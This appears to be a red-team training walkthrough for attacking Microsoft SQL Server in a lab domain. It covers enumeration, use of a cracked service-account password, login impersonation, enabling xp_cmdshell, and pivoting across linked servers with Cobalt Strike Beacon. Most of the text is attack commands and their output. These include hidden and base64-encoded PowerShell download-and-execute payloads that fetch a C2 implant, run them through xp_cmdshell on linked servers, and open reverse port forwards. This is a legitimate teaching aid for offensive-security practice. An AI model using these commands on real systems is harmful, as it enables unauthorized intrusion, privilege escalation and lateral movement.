# MS SQL Servers

Microsoft SQL Server is a relational DBMS commonly found in Windows, used to store information to support many business functions. In addition to the obvious data theft opportunities, MSSQL has a large attack surface allowing code execution, privilege escalation, lateral movement, and persistence.

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) and [SQLRecon](https://github.com/skahwah/SQLRecon) are good for enumerating and interacting with MS SQL.

PowerUpSQL can find MSSQL using Get-SQLInstanceDomain, Get-SQLInstanceBroadcast and Get-SQLInstanceScanUDP:

* Get-SQLInstanceDomain searches for SPNs that begin with MSSQL*. Can also search the domain for groups that sound like they may have access to database instances (for example, a "SQL Admins" group).

      beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
      beacon> powershell Get-SQLInstanceDomain

* Get-SQLConnectionTest can be used to test whether we can connect to the database:

      beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

* Get-SQLServerInfo to gather more information about the instance:

      beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

If multiple SQL Servers exist, chain these commands together to automate the data collection:

    beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the ```info``` module.

    beacon> execute-assembly SQLRecon.exe /enum:sqlspns
    beacon> execute-assembly SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

The /auth:wintoken option uses the access token of the Beacon. The example output shows that while the database is accessible, the current user is not a sysadmin. SQLRecon has a nice module which can show us what roles we do have:

    beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

On a default installation, standard users do not have the "public" role by default and must be explicitly granted through SQL Server Manager Studio (SSMS). The SQL information cannot be enumerated if the user's security context does not have a valid role. Finding a user (or group) that does have access can be challenging. Look for appropriately named domain groups and their members:

    beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

Another option is to go after the MS SQL service account itself (often given sysadmin). The basis of BloodHound's SQLAdmin attack path. The domain account used to run the service is DEV\mssql_svc and the account is kerberoastable owing to its SPN.  If we can crack its plaintext password, we can use it to gain access to the SQL instance. The credentials can be used with make_token in Beacon and /a:WinToken in SQLRecon or the /a:WinDomain option with /d:<domain> /u:<username> /p:<password> in SQLRecon directly:

    beacon> execute-assembly SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

With access several options exist for issuing queries against a SQL instance.

* Get-SQLQuery from PowerUpSQL:

      beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

* SQLRecon:

      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"

* mssqlclient.py from Impacket via proxychains:

      ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
      SQL> select @@servername;

* [HeidiSQL](https://www.heidisql.com) via Proxifier (a GUI tool)

## MS SQL Impersonation

MS SQL impersonation/context switching allows an executing user to use the permissions of another user without authenticating (must be explicitly granted through securable configurations: Login properties > Impersonate permission; Domain Users impersonating the DEV\mssql_svc account is a security issue since it elevates all Domain Users to sysadmin). Discover accounts to impersonate manually using the following queries:

      SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

The IDs returned don't mean much, so look them up with:

      SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;

Or write a SQL query joins these two, or use SQLRecon's impersonate module:

      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
      
Take advantage of this as bfarmer, who we know is not a sysadmin:

      > SELECT SYSTEM_USER;
      DEV\bfarmer
      > SELECT IS_SRVROLEMEMBER('sysadmin');
      0

Use EXECUTE AS to execute a query in the context of the target:

      > EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
      DEV\mssql_svc
      > EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
      1

SQLRecon modules can also impersonate by prefixing the module name with an i and specifying the principal to impersonate:

      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

## MS SQL Command Execution

xp_cmdshell can be used to execute shell commands on the SQL server if user has sysadmin privileges. Invoke-SQLOSCmd from PowerUpSQL provides a simple means of using it:

      beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

The same will fail if you try manually in Heidi or mssqlclient, because xp_cmdshell is disabled.

      SQL> EXEC xp_cmdshell 'whoami';
      [-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.

To show the state of xp_cmdshell (0 shows that xp_cmdshell is disabled):

      SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

To enable it:

      sp_configure 'Show Advanced Options', 1; RECONFIGURE;
      sp_configure 'xp_cmdshell', 1; RECONFIGURE;
      
Invoke-SQLOSCmd works because it attempts to enable xp_cmdshell if it's not already, execute the given command, and then disable it again. This is a good example of why you should study your tools before you use them, so you know what is happening under the hood.

Clean up when you're done; always return a configuration change on a target to its original value.

SQLRecon has a module for changing the xp_cmdshell configuration, which can also be combined with the impersonation module:

      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
      beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig

With command execution, we can try to execute a Beacon payload. As with other servers in the lab, the SQL servers cannot talk directly to the team server to download a payload. 

1: Instead, setup a reverse port forward to tunnel that traffic through the C2 chain:

      beacon> run hostname
      beacon> getuid
      beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
      beacon> rportfwd 8080 127.0.0.1 80

2: Host smb_x64.ps1 at /b on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.

      beacon> portscan 10.10.122.25 445

3: Download and execute the payload:

      powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"

or

      powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=

4: Keep an eye on the web log to see when the payload has been fetched:

      01/05 15:09:07 visit (port 80) from: 127.0.0.1
	      Request: GET /b
	      page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
	      null

5: Link to the Beacon:

      beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337

What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.

## MS SQL Lateral Movement

SQL Servers have a concept called "links", which allows a database instance to access data from an external source. MS SQL supports multiple sources, including other MS SQL Servers. These can also be practically anywhere: other domains, forests, or in the cloud. Discover any links that the current instance has:

	SELECT srvname, srvproduct, rpcout FROM master..sysservers;

The SQLRecon links module could also be used:

	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links

Send SQL queries to linked servers using OpenQuery (double or single quotes is important!):

	SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');

Or with SQLRecon:

	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

Check the xp_cmdshell status:

	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

If xp_cmdshell is disabled, can't enable it by executing sp_configure. If RPC Out is enabled on the link (which is not by default), enable it (square brackets required):

	EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
	EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

Query SQL-1 to find out if it has links too:

	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io

Manually querying each server to find additional links can take a long time. Get-SQLServerLinkCrawl can automatically crawl all available links and shows information for each instance (e.g. version, who configured, whether admin, etc):

	beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"

Your privileges on the linked server depends on how the link is configured (in the example, any user who has public read access to the SQL-2 DB inherits sysadmin rights on SQL-1; we do not need to be sysadmin on SQL-2 first). The lwhoami module in SQLRecon can show similar information:

	beacon> execute-assembly SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io

To get a Beacon on SQL-1, repeat the same steps as above. However, SQL-1 may only be able to talk to SQL-2 and not to WKSTN-2 or any other machine in the DEV domain:

	beacon> run hostname
	sql-2
	beacon> getuid
	[*] You are DEV\mssql_svc (admin)
	beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
	beacon> rportfwd 8080 127.0.0.1 80

Use xp_cmdshell on a linked server via OpenQuery (need to prepend a dummy query for it to work):

	SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''')

Or use the "AT" syntax:

	EXEC('xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGIAJwApAA==''') AT [sql-1.cyberbotic.io]

SQLRecon also has a lxpcmd module. Once the payload has been executed, connect to the Beacon:

	beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
	[+] established link to child beacon: 10.10.120.25


